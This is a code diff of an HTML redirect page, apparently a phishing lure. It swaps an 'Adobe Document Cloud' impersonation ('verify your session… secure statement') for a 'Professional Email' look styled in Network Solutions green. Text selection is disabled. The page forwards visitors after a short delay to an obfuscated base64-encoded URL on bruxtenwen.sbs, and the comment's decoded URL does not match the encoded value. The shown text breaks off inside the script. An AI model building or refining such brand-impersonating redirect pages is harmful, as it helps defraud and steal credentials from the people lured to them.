@@ -1,144 +1,50 @@
+<!-- language: HTML/CSS/JS, file: redirect.html, target: modern browsers -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Adobe Document Cloud</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <title>Redirecting - Professional Email</title>
+    <link rel="icon" type="image/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTiqbU7PKJ645a_GaSGzdOI-_mHR_TuJm3sHL7Q6viTpQ&s=10" />
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         html, body { height: 100%; }
         body {
-            background: #ffffff;
+            background: #fafafa;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            padding: 32px 20px;
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-            color: #1a2b3c;
-            -webkit-font-smoothing: antialiased;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
         }
 
-        .card {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            text-align: center;
-            gap: 24px;
-            padding: 56px 48px 48px;
-            max-width: 460px;
-            width: 100%;
-        }
-
-        /* Logo container — Adobe red */
-        .logo-wrap {
-            width: 100px;
-            height: 100px;
-            border-radius: 16px;
-            background: #f8fafc;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 8px 24px rgba(250, 15, 0, 0.14);
-            padding: 10px;
-            overflow: hidden;
-        }
-
-        .logo-wrap img {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-            display: block;
-        }
-
-        .agency-name {
-            font-size: 0.72rem;
-            font-weight: 600;
-            letter-spacing: 2.5px;
-            text-transform: uppercase;
-            color: #fa0f00;
-        }
-
-        h1 {
-            font-size: 1.45rem;
-            font-weight: 600;
-            color: #2c2c2c;
-            letter-spacing: -0.3px;
-            line-height: 1.35;
-        }
-
-        .sub {
-            font-size: 0.92rem;
-            color: #5a7086;
-            line-height: 1.6;
-            max-width: 340px;
-        }
-
+        /* Clean, simple green spinner */
         .loader {
-            width: 200px;
-            height: 3px;
-            background: #e8eef4;
-            border-radius: 50px;
-            overflow: hidden;
-            margin-top: 8px;
-            position: relative;
-        }
-        .loader::after {
-            content: "";
-            position: absolute;
-            inset: 0;
-            width: 45%;
-            background: #fa0f00;
-            border-radius: 50px;
-            animation: slide 1.8s ease-in-out infinite;
-        }
-        @keyframes slide {
-            0%   { transform: translateX(-100%); }
-            100% { transform: translateX(320%); }
+            width: 48px;
+            height: 48px;
+            border: 4px solid #e5e7eb;
+            border-top: 4px solid #1a6b5c; /* Network Solutions green */
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
         }
 
-        .footnote {
-            margin-top: 8px;
-            font-size: 0.72rem;
-            color: #9aabbc;
-            letter-spacing: 0.3px;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
         @media (prefers-reduced-motion: reduce) {
-            *, *::before, *::after {
-                animation-duration: 0.01ms !important;
-                transition-duration: 0.01ms !important;
-            }
-        }
-
-        @media (max-width: 480px) {
-            .card { padding: 40px 28px 36px; }
-            h1 { font-size: 1.25rem; }
+            .loader { animation: none; border-top-color: #e5e7eb; }
         }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <!-- Logo -->
-        <div class="logo-wrap">
-            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQduXJREqBe_A7tkWoD48jL35xRpT_WaxP_tQ&s" alt="Adobe Logo" onerror="this.style.display='none'">
-        </div>
-
-        <div class="agency-name">Adobe Document Cloud</div>
-
-        <h1>Preparing your document…</h1>
-
-        <p class="sub">Please wait while we verify your session and prepare your secure statement.</p>
-
-        <div class="loader"></div>
-
-        <div class="footnote">Do not close this window</div>
-    </div>
+    <div class="loader"></div>
 
     <script type="text/javascript">
         // ============================================
@@ -146,7 +52,7 @@
         // Decodes to: https://bruxtenwen.sbs/movingyou999
         // ============================================
         var DEST_B64 = 'aHR0cHM6Ly9icnV4dGVud2VuLnNicy9yc3ZwX21vdmVtZW50';
-        var REDIRECT_DELAY = 3500;
+        var REDIRECT_DELAY = 2000;
 
         var DESTINATION;
         try {
